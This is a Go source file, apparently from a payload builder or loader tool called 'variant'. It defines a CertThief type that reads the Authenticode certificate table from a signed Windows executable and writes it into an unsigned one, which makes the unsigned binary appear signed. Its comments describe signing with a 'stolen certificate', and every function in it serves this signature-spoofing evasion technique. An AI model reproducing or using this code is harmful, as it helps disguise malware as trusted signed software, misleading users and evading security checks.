package build

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"variant/log"

	"github.com/Binject/debug/pe"
)

// CertThief 结构体，用于签名操作
type CertThief struct {
	SignDir  string // 签名目录
	SrcFile  string // 未签名的源文件
	DstFile  string // 已签名的目标文件
	SignedPE string // 签名后的输出文件
	CertFile string // 证书文件
}

// readCertTable 从PE文件中读取证书表
func (ct *CertThief) readCertTable(filePath string) ([]byte, error) {
	fileBytes, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read file: %v", err)
	}

	fileReader := bytes.NewReader(fileBytes)
	peFile, err := pe.NewFile(fileReader)
	if err != nil {
		return nil, fmt.Errorf("failed to parse PE file: %v", err)
	}

	return peFile.CertificateTable, nil
}

// saveSignedPE 保存带有证书表的PE文件
func (ct *CertThief) saveSignedPE(certTable []byte, outputFileName string) error {
	peFile, err := pe.Open(filepath.Join(ct.SignDir, ct.SrcFile))
	if err != nil {
		return fmt.Errorf("failed to open PE file: %v", err)
	}
	defer peFile.Close()

	peFile.CertificateTable = certTable

	outputFilePath := filepath.Join(ct.SignDir, outputFileName)
	if err := peFile.WriteFile(outputFilePath); err != nil {
		return fmt.Errorf("failed to write PE file: %v", err)
	}

	log.Infof("Signed file saved to: %s", outputFilePath)
	return nil
}

// SaveCertificate 将证书表保存到指定文件
func (ct *CertThief) SaveCertificate() error {
	certTable, err := ct.readCertTable(filepath.Join(ct.SignDir, ct.DstFile))
	if err != nil {
		return err
	}

	certFilePath := filepath.Join(ct.SignDir, ct.CertFile)
	if err := os.WriteFile(certFilePath, certTable, os.ModePerm); err != nil {
		return fmt.Errorf("failed to save certificate: %v", err)
	}

	log.Infof("Certificate saved to %s", certFilePath)
	return nil
}

// SignWithStolenCert 使用窃取的证书对源文件进行签名
func (ct *CertThief) SignWithStolenCert() error {
	certBytes, err := os.ReadFile(filepath.Join(ct.SignDir, ct.CertFile))
	if err != nil {
		return fmt.Errorf("failed to read certificate file: %v", err)
	}

	return ct.saveSignedPE(certBytes, ct.SignedPE)
}

// SignExecutable 使用目标文件的证书对源文件进行签名
func (ct *CertThief) SignExecutable() error {
	certTable, err := ct.readCertTable(filepath.Join(ct.SignDir, ct.DstFile))
	if err != nil {
		return err
	}

	return ct.saveSignedPE(certTable, ct.SignedPE)
}
